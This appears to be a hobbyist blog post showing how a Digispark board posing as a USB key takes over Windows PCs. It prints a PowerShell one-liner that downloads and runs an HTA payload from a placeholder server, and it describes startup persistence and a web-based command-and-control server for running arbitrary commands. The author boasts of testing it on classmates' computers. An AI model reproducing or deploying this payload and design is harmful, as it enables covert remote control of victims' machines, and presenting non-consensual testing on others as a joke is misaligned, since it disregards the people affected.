## Demo

I recently posted [a video](https://www.youtube.com/watch?v=vo7N044aZvU) on my [YouTube Channel](https://www.youtube.com/channel/UCGj6pfxZ0XYJU29XNwXPPxg/featured) showing how easy it is to take control of a computer with a fake USB key. Here it is:

#demo

![youtube](https://www.youtube.com/embed/vo7N044aZvU)

Essentially, when you plug the USB key in a PC, it types commands to give control of your computer to the attacker. Once a computer is infected, you will be able to control it by going to a website from another computer or even from a cell phone!

## How it Works

The _fake USB key_ is in fact made from an arduino-compatible board, a `Digispark`. You can buy some from [here](https://www.ebay.com/itm/Digispark-Kickstarter-ATTINY85-General-Micro-USB-Development-Board-Sale/173925228046?hash=item287ec05e0e:g:hQIAAOSwTuJYpT~p).

> Arduino is an open-source hardware and software company, project and user community that designs and manufactures single-board microcontrollers and microcontroller kits for building digital devices.
>
> [Wikipedia](https://en.wikipedia.org/wiki/Arduino)

It also has a custom case, made using _3D printing_. You can [download the STL file here](./Case%204%20v9.stl).

Arduino boards are perfect for small electronics projects. However, the `Digispark` is a special _Arduino_ board: it can be programmed to automatically send keystrokes to a computer, and this is the key to easily infect a computer in a matter of seconds. It types commands really fast to download a program from a remote server, which itself copies itself on the computer so that it starts up as soon as the infected computer boots.

After that, the attacker goes to the server's `IP` address on a web browser to connect to it. From the web interface, he can send commands in `JavaScript`, `JScript` or even use _CMD_ or _PowerShell_ to do literally everything he wants to the infected computer.

## Under the Hood

What I find most interesting about this project is how it all works _under the hood_. First, let's talk about the commands typed by the "USB" key (the [Digispark](https://www.ebay.com/itm/Digispark-Kickstarter-ATTINY85-General-Micro-USB-Development-Board-Sale/173925228046?hash=item287ec05e0e:g:hQIAAOSwTuJYpT~p)) to easily infect a computer. It opens up _Windows PowerShell_ using the _Run_ prompt, and then types the following command:

```shell
$p = "$env:temp/client.hta";(New-Object System.Net.WebClient).DownloadFile("http://SERVER_IP/client.hta", $p);cd $env:temp;start -PSPath $p;
```

What this command does is simple: it navigates to `http://SERVER_IP/client.hta` and downloads the client.hta file onto the user's hard drive, in the `TEMP` directory. Once this is done, it executes it, which copies it on the user's startup folder (so that it runs every time the machine boots up) and constantly pings the server using a `POST` request to see if a command is available.

> In computing, POST is a request method supported by HTTP used by the World Wide Web. By design, the POST request method requests that a web server accepts the data enclosed in the body of the request message, most likely for storing it. It is often used when uploading a file or when submitting a completed web form.
>
> [Wikipedia](<https://en.wikipedia.org/wiki/POST_(HTTP)>)

Here is how the server works:

- When the server is sent a `POST` request, it looks up in its database to see if a command is ready to be sent to the infected computer. If so, it sends the `JavaScript` command as a response to the `POST` request.
- When the server is sent a `GET` request with the corresponding _password_, it just responds with the webpage for the attacker, in order to be able to send commands wirelessly. If the `GET` request contains an `IP` address and a command, then it is stored in the database, waiting for an infected computer to ask for its command. As said previously, when this happens, the command is sent to the victim computer for it to execute.
- Finally, when the server is asked for the `log`, it sends all the commands from the database with their responses from the infected computer, so that they can be displayed on the attacker's web interface.

## Final Words

This is a project that took me a while to polish down to its final shape. Now that it is completed, I am really happy with the result! Even if I do not recommend you do so, I have tested it successfully on my classmates' computers, and their reactions were priceless.
